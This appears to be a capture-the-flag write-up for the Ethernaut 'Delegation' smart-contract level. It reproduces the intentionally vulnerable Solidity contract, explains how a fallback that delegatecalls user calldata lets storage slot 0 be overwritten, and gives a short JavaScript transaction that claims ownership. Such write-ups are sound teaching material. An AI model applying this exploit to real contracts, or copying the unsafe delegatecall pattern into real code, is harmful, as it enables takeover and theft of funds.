# Ethernaut Delegation Level Attack

## Goal

The goal of this level is for you to claim ownership of the instance you are given.

--- 

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

## Root cause

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if(result) {
        this;
    }
}

```

The problem here is the unsafe part where using `delegatecall` inside `fallback()` to forward arbitrary user-controlled calldata

In this case: `Delegate` code runs, but `Delegate` storage is modified.

As it has a dangerous function:
```solidity
function pwn() public {
    owner = msg.sender;
}
```

If called directly on `Delegate`, it changes `Delegate.owner`. However, when called through `delegatecall` from `Delegation`, it changes `Delegation.owner`. It works as it stores `owner` in storage slot 0, so `Delegate.pwn()` writes to `owner`, it overwrites `Delegation.owner`

## Attack plan

Step 1: Attacker sends calldata for `pwn()` to `Delegation`

```javascript
await contract.sendTransaction({
    data: web3.utils.sha3("pwn()").slice(0, 10)
});
```

Step 2: `Delegation` does not have `pwn()`

Step 3: `fallback()` is triggered then `fallback()` delegatecalls `Delegate`

Step 4: `Delegate.pwn()` executes in `Delegation`'s storage context, so `Delegation.owner = attacker`. Check the owner: 
```javascript
await contract.owner();
```